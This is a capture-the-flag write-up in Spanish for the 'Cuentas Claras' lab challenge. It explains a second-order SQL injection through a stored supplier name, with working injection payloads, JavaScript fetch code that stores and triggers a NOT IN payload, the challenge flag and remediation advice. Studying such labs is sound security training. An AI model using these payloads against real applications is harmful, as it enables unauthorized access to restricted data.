# Writeup — Cuentas Claras (HackLab 2026)

**Plataforma:** HackLab (SoftwareSeguro)  
**Edición:** HackLab 2026  
**Categoría:** SQLi (Second-Order / Inyección en campo almacenado)    
**Puntaje:** 30 pts  
**Flag:** `0ffd15f002b98f6bd62346b947b8d15a`  

---

## 📌 Enunciado y Descripción

> **Cuentas Claras** es una herramienta interna de contaduría.
>
> Hay 20 categorías en la base de datos, pero el selector solo te deja elegir 17: existen **3 categorías restringidas** a las que no se puede dar de alta proveedores (ni aparecen en el selector ni el servidor las acepta). Esas 3 categorías igual tienen movimientos cargados.
>
> **Objetivo:** Averiguar cuántos movimientos hay en las 3 categorías restringidas, sumarlos, y calcular el hash MD5 de esa suma como flag.

---

## 🔍 Reconocimiento

La aplicación web tiene dos endpoints principales:

- `POST /alta` — Da de alta un proveedor con los campos `nombre` y `categoria`.
- `POST /movimientos/<id>` — Devuelve la cantidad de movimientos registrados para ese proveedor.

El selector HTML lista 17 categorías permitidas:

```text
Capacitacion, Catering, Consultoria, Insumos, Limpieza, Logistica,
Mantenimiento, Marketing, Mobiliario, Papeleria, Seguridad, Servicios,
Software, Tecnologia, Telefonia, Transporte, Viaticos
```

Intentar dar de alta un proveedor enviando en `categoria` un valor inventado devuelve:

```text
Categoría inválida o restringida: no se pueden agregar proveedores en esa categoría.
```

El servidor devuelve exactamente el mismo mensaje tanto para categorías inexistentes como para las restringidas, por lo que **no es posible enumerar las restringidas por diferencia de error**.

---

## 🔬 Identificación de la Vulnerabilidad

Al probar payloads de inyección SQL en el campo `nombre`:

```text
nombre = test'--
nombre = test' OR '1'='1
```

Ambos valores se insertan en la BD sin sanitizar y aparecen reflejados en la tabla de proveedores. El campo `categoria` sí es validado estrictamente en el backend, pero `nombre` no cuenta con validación ni escape.

Esto constituye una **inyección SQL de segundo orden (Stored / Second-Order SQLi)**: el payload malicioso se almacena de forma inofensiva durante el primer request (`/alta`) y se ejecuta recién en un request posterior (`/movimientos/<id>`), cuando el servidor recupera el nombre guardado y lo concatena en una segunda query a la base de datos.

---

## 🚀 Explotación Paso a Paso

### Paso 1 — Confirmar la inyección de segundo orden

Al dar de alta un proveedor con nombre `x' OR '1'='1` y luego consultar sus movimientos:

```javascript
fetch('/alta', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: "nombre=x' OR '1'='1&categoria=Catering"
});
```

La respuesta de `/movimientos/<id>` devuelve **51.340 movimientos**, que corresponde al total absoluto de movimientos de todas las categorías en la base de datos. La condición `OR '1'='1` hace que la cláusula `WHERE` sea siempre verdadera.

Esto confirma que la consulta interna ejecutada por el servidor es equivalente a:

```sql
SELECT COUNT(*) FROM movimientos WHERE proveedor = '<nombre>'
```

Donde `<nombre>` es sustituido dinámicamente con el valor guardado en la base de datos, sin parametrizar ni escapar.

---

### Paso 2 — Contar movimientos de las 3 categorías restringidas

Dado que se conocen las 17 categorías visibles y el total es 20, en vez de adivinar o forzar por fuerza bruta los nombres de las 3 categorías restringidas, se construye un payload que selecciona el complemento excluyendo las 17 permitidas mediante el operador `NOT IN`:

```javascript
const conocidas = [
  'Capacitacion', 'Catering', 'Consultoria', 'Insumos', 'Limpieza',
  'Logistica', 'Mantenimiento', 'Marketing', 'Mobiliario', 'Papeleria',
  'Seguridad', 'Servicios', 'Software', 'Tecnologia', 'Telefonia',
  'Transporte', 'Viaticos'
];
const lista = conocidas.map(c => `'${c}'`).join(',');

const payload = `x' OR categoria NOT IN (${lista}) AND '1'='1`;

// 1. Dar de alta el proveedor con el payload en el nombre
const r1 = await fetch('/alta', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: `nombre=${encodeURIComponent(payload)}&categoria=Catering`
});
const t1 = await r1.text();
const id = t1.match(/class="idcol">(\d+)/)?.[1];

// 2. Consultar los movimientos del proveedor creado
const r2 = await fetch(`/movimientos/${id}`, {method: 'POST'});
const t2 = await r2.text();
console.log(t2.match(/class="flash[^"]*">(.*?)<\/div>/s)?.[1]);
```

La query resultante ejecutada en el motor de base de datos es:

```sql
SELECT COUNT(*) FROM movimientos
WHERE proveedor = 'x'
   OR categoria NOT IN ('Capacitacion','Catering',...,'Viaticos')
  AND '1'='1'
```

Resultado de la consulta: **9.763 movimientos** en las 3 categorías restringidas.

---

### Paso 3 — Calcular la Flag

Con la suma obtenida (`9763`), se genera su hash MD5:

```bash
echo -n "9763" | md5sum
# 0ffd15f002b98f6bd62346b947b8d15a
```

O en Python:
```python
import hashlib
print(hashlib.md5("9763".encode()).hexdigest())
# 0ffd15f002b98f6bd62346b947b8d15a
```

---

## 🏁 Flag

```text
0ffd15f002b98f6bd62346b947b8d15a
```

---

## 💡 Lecciones Aprendidas y Remediación

- **Naturaleza de la SQLi de Segundo Orden:** Es considerablemente más difícil de detectar mediante escaneos superficiales porque el ingreso del payload (`/alta`) y su detonación (`/movimientos/<id>`) están desacoplados en el tiempo y en distintas funcionalidades. El endpoint donde se inyecta el dato no produce un error inmediato.
- **Técnica del complemento (`NOT IN`):** Cuando el espacio de valores válidos o conocidos es acotado (17 de 20), usar la negación del conjunto conocido permite consultar los datos restringidos directamente sin necesidad de extraer o adivinar sus identificadores.
- **Remediación:**
  - **Consultas parametrizadas (Prepared Statements):** Utilizar parámetros vinculados (`?` o `$1`) tanto al escribir como al consultar datos derivados de la base.
  - **Normalización de modelos relacionales:** Vincular tablas mediante claves foráneas numéricas (`proveedor_id INT`) en lugar de almacenar cadenas de texto como identificadores en la tabla de movimientos.
